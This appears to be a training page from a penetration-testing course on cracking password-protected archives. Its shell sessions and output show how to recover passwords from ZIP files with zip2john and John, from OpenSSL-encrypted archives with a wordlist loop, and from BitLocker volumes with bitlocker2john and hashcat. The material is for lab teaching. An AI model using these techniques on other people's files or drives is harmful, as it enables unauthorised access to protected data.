<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/147/section/1323
// Platform Version: V1
// Module ID: 147
// Module Name: Password Attacks
// Module Difficulty: Medium
// Section ID: 1323
// Section Title: Protected Archives
// Page Title: Password Attacks
// Page Number: 17
-->

# Protected Archives

**Module Name:** Password Attacks **Page Number:** 17

#### PASSWORD ATTACKS

# Protected Archives

#### Download All File Extensions

``` shell-session
[!bash!]$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt

.mint
.htmi 
.tpsr
.mpkg  
.arduboy
.ice
.sifz 
.fzpz 
.rar     
.comppkg.hauptwerk.rar
...SNIP...
```

## Cracking Archives

## Cracking ZIP

#### Using zip2john

``` shell-session
[!bash!]$ zip2john ZIP.zip > zip.hash

ver 2.0 efh 5455 efh 7875 ZIP.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=42, decmplen=30, crc=490E7510
```

#### Viewing the Contents of zip.hash

``` shell-session
[!bash!]$ cat zip.hash 

ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip
```

#### Cracking the Hash with John

``` shell-session
[!bash!]$ john --wordlist=rockyou.txt zip.hash

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1234             (ZIP.zip/customers.csv)
1g 0:00:00:00 DONE (2022-02-09 09:18) 100.0g/s 250600p/s 250600c/s 250600C/s 123456..1478963
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

#### Viewing the Cracked Hash

``` shell-session
[!bash!]$ john zip.hash --show

ZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip

1 password hash cracked, 0 left
```

## Cracking OpenSSL Encrypted Archives

#### Listing the Files

``` shell-session
[!bash!]$ ls

GZIP.gzip  rockyou.txt
```

#### Using file

``` shell-session
[!bash!]$ file GZIP.gzip 

GZIP.gzip: openssl enc'd data with salted password
```

#### Using a for-loop to Display Extracted Contents

``` shell-session
[!bash!]$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now

<SNIP>
```

#### Listing the Contents of the Cracked Archive

``` shell-session
[!bash!]$ ls

customers.csv  GZIP.gzip  rockyou.txt
```

## Cracking BitLocker Encrypted Drives

#### Using bitlocker2john

``` shell-session
[!bash!]$ bitlocker2john -i Backup.vhd > backup.hashes
[!bash!]$ grep "bitlocker\$0" backup.hashes > backup.hash
[!bash!]$ cat backup.hash

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e...SNIP...70696f7eab6b
```

#### Using hashcat to Crack backup.hash

``` shell-session
[!bash!]$ hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked

hashcat (v6.1.1) starting...

<SNIP>

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: BitLocker
Hash.Target......: $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$10...8ec54f
Time.Started.....: Wed Feb  9 11:46:40 2022 (1 min, 42 secs)
Time.Estimated...: Wed Feb  9 11:48:22 2022 (0 secs)
Guess.Base.......: File (/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       28 H/s (8.79ms) @ Accel:32 Loops:4096 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2880/6163 (46.73%)
Rejected.........: 0/2880 (0.00%)
Restore.Point....: 2816/6163 (45.69%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1044480-1048576
Candidates.#1....: chemical -> secrets

Started: Wed Feb  9 11:46:35 2022
Stopped: Wed Feb  9 11:48:23 2022
```

#### Viewing the Cracked Hash

``` shell-session
[!bash!]$ cat backup.cracked 

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
```

#### Windows - Mounting BitLocker VHD

![https://academy.hackthebox.com/storage/modules/147/bitlocker.png](https://academy.hackthebox.com/storage/modules/147/bitlocker.png)

# 

# 

#### Questions

####